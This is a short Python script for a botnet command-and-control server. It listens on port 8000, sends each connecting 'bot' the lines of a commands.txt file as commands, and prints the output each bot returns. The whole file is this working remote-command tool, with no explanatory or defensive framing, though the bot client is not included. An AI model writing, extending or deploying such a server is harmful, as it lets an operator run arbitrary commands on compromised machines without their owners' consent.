import socketserver

class BotHandler(socketserver.BaseRequestHandler):

    def handle(self):
        "handle any request received "
        self.data=self.request.recv(1024).strip()
        print("Bot with IP {} sent : ".format(self.client_address[0]))
        print('sending command ...')
        with open('commands.txt') as file:
            print('file is open')
            for line in file:
                print('RUN {} :'.format(line))
                self.request.sendall(line.encode())
                self.data=self.request.recv(1024).strip()
                print('\toutput : {}'.format(self.data))
        self.request.sendall('end'.encode())

if __name__=='__main__':
    HOST,PORT='',8000
    tcpserver=socketserver.TCPServer((HOST,PORT),BotHandler)
    try:
        print('Bot server is listening...')
        tcpserver.serve_forever()
    except:
        print('Oups ! : An error occured .')
